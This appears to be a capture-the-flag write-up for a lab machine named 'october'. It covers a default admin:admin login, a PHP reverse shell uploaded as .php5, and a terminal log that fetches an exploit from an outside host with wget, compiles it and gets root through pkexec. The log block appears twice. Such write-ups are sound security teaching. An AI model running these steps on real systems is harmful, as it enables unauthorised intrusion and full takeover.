The following webpage is returned:

After some digging around, I notice the admin page is located at /backend and the default credentials are admin:admin:

Download a PHP reverse shell and save it as .php5 extension:

This gets uploaded successfully as shown in the image above.

Click on the Public URL of the upload webshell to access it. Then we should obtain a reverse shell connection:

The version of pkexec is 0.105 and gcc is available. Download and run the local privilege escalation exploit to obtain a root shell:

www-data@october:/tmp$ wget http://10.10.14.168/exp.c 
wget http://10.10.14.168/exp.c 
--2026-03-07 01:58:54--  http://10.10.14.168/exp.c
Connecting to 10.10.14.168:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1267 (1.2K) [text/x-csrc]
Saving to: 'exp.c'

100%[======================================>] 1,267       --.-K/s   in 0s      

2026-03-07 01:58:54 (194 MB/s) - 'exp.c' saved [1267/1267]

www-data@october:/tmp$ chmod +x exp.c
chmod +x exp.c
www-data@october:/tmp$ gcc exp.c -o exp
gcc exp.c -o exp
www-data@october:/tmp$ chmod +x exp
chmod +x exp
www-data@october:/tmp$ ./exp
./exp
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# 

www-data@october:/tmp$ wget http://10.10.14.168/exp.c 
wget http://10.10.14.168/exp.c 
--2026-03-07 01:58:54--  http://10.10.14.168/exp.c
Connecting to 10.10.14.168:80... connected.
HTTP request sent, awaiting response... 200 OK

Saving to: 'exp.c'

100%[======================================>] 1,267       --.-K/s   in 0s      

2026-03-07 01:58:54 (194 MB/s) - 'exp.c' saved [1267/1267]

www-data@october:/tmp$ chmod +x exp.c
chmod +x exp.c
www-data@october:/tmp$ gcc exp.c -o exp
gcc exp.c -o exp
www-data@october:/tmp$ chmod +x exp
chmod +x exp
www-data@october:/tmp$ ./exp
./exp
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

This is the unintentional path for privilege escalation.
